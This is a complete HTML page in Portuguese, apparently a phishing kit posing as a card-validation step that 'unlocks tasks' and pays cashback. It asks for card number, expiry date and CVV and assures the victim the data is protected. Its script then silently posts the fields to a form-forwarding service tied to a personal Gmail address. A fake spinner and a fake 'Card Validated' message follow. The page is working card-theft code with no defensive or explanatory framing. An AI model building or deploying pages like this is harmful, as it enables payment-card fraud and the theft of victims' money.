<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Validação de Cartão</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
  <style>
    body {
      margin: 0;
      background-color: #f3f3f3;
      font-family: 'Roboto', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      background-color: #fff;
      padding: 32px 32px 20px 32px;
      border-radius: 14px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.08);
      max-width: 380px;
      width: 100%;
      text-align: center;
      transition: all 0.3s ease;
    }

    h2 {
      color: #c5002e;
      margin-bottom: 15px;
      font-size: 21px;
    }

    p.subtitulo {
      font-size: 14px;
      color: #444;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 12px 14px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 10px;
      font-size: 15px;
      transition: border 0.3s;
    }

    input:focus {
      outline: none;
      border-color: #c5002e;
    }

    button {
      width: 100%;
      background-color: #c5002e;
      color: white;
      border: none;
      padding: 14px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 10px;
      cursor: pointer;
      margin-top: 12px;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #a80025;
    }

    .info {
      font-size: 13px;
      color: #777;
      margin-top: 14px;
    }

    .hidden {
      display: none;
    }

    .loading img {
      width: 45px;
      margin-bottom: 15px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }

    .final h2 {
      color: #2e7d32;
      font-size: 20px;
    }

    .final p {
      font-size: 14px;
      color: #555;
      margin-top: 10px;
    }
  </style>
</head>
<body>

  <!-- Tela do formulário -->
  <div class="container" id="formulario">
    <h2>Validação de Cartão</h2>
    <p class="subtitulo">Use um cartão válido para liberar suas tarefas e receber cashback no saldo</p>
    <form id="cartaoForm">
      <input type="text" name="numero_cartao" placeholder="Número do cartão" required maxlength="19">
      <input type="text" name="validade" placeholder="Validade (MM/AA)" required maxlength="5">
      <input type="text" name="cvv" placeholder="Código de segurança (CVV)" required maxlength="4">
      <input type="hidden" name="_captcha" value="false">
      <button type="submit">Validar agora</button>
    </form>
    <p class="info">Suas informações estão protegidas com segurança.</p>
  </div>

  <!-- Tela de carregamento -->
  <div class="container hidden" id="carregando">
    <div class="loading">
      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando">
      <p>Processando os dados...</p>
    </div>
  </div>

  <!-- Tela final -->
  <div class="container hidden final" id="final">
    <h2>✅ Cartão Validado</h2>
    <p>Você já pode iniciar suas tarefas.<br>Em breve entraremos em contato por e-mail ou WhatsApp.</p>
  </div>

  <script>
    const form = document.getElementById("cartaoForm");
    const formulario = document.getElementById("formulario");
    const carregando = document.getElementById("carregando");
    const final = document.getElementById("final");

    form.addEventListener("submit", function(e) {
      e.preventDefault();

      formulario.classList.add("hidden");
      carregando.classList.remove("hidden");

      const dados = new FormData(form);
      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
        method: "POST",
        headers: { 'Accept': 'application/json' },
        body: dados
      });

      setTimeout(() => {
        carregando.classList.add("hidden");
        final.classList.remove("hidden");
      }, 2500);
    });
  </script>

</body>
</html>
